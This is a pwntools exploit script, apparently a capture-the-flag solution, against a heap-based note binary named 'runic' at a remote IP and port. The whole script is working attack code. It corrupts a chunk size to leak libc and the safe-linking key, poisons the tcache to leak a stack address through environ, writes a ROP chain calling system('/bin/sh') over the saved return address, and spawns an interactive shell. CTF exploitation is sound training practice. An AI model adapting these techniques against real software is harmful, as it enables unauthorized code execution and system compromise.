#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'
exe = ELF('runic', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
    gdb.attach(r, gdbscript='''
        b*main+48
        c
        # c 31
        # b*edit+481
    ''')

info = lambda msg: log.info(msg)
sla = lambda msg, data: r.sendlineafter(msg, data)
sa = lambda msg, data: r.sendafter(msg, data)
sl = lambda data: r.sendline(data)
s = lambda data: r.send(data)

if args.REMOTE:
    r = remote('178.62.9.10', 31313)
else:
    r = process(exe.path)
    GDB()

def create(name, size, note = b'/bin/sh\x00'):
    sa(b'Action: \n', b'1')
    sa(b'name: \n', name)
    sa(b'length: \n', str(size).encode())
    sa(b'contents: \n', note)
    
def choice(choice, name):
    sa(b'Action: \n', str(choice).encode())
    sa(b'name: \n', name)
    
def edit(oldname, newname, note):
    sa(b'Action: \n', b'3')
    sa(b'name: \n', oldname)
    sa(b'name: \n', newname)
    sa(b'contents: \n', note)
    
libc_off = 0x1f3001
pop_rdi_off = 0x000000000002daa2

create(b'\x00', 0x60)
create(b'1', 0x20)
for i in range(10):
    create(str(chr(i+5)).encode(), 0x60)
    
for i in range(6):
    create(str(chr(i+15)).encode(), 0x30)

payload = b'a'*0x20 + p64(0x461)
edit(b'1', b'\x00\x04', payload)
choice(2, b'\x05')

create(b'\x21', 0x20, b'\x01')
choice(4, b'\x21')
r.recvuntil(b'contents:\n\n')
libc.address = u64(r.recv(6) + b'\x00'*2) - libc_off
print(hex(libc.address))

choice(2, b'\x10')
payload = b'a'*0x34 + b'abcd'
edit(b'\x0f', b'\x00\x02', payload)
choice(4, b'\x02')
r.recvuntil(b'abcd')
key = u64(r.recv(5) + b'\x00'*3)
print(hex(key))

choice(2, b'\x12')
print(hex(libc.sym['environ']))
payload = b'a'*0x30 + p64(0x41) + p64((libc.sym['environ'] - 16) ^ key)
edit(b'\x11', b'\x00\x01', payload)

create(b'\x30', 0x30)
create(b'\x31', 0x30, b'a'*4 + b'abcd')
choice(4, b'1')
r.recvuntil(b'abcd')
stack = u64(r.recv(6) + b'\x00'*2)
print(hex(stack))

saverip = stack - 0x150 - 8
print(hex(saverip))

choice(2, b'\x30')
choice(2, b'\x14')
payload = b'a'*0x30 + p64(0x41) + p64(saverip ^ key)
edit(b'\x13', b'\x00\x03', payload)

pop_rdi = libc.address + pop_rdi_off

create(b'2', 0x30)
payload = flat(
    pop_rdi, next(libc.search(b'/bin/sh')),
    pop_rdi + 1,
    libc.sym['system']
)
create(b'3', 0x30, payload)

r.interactive()
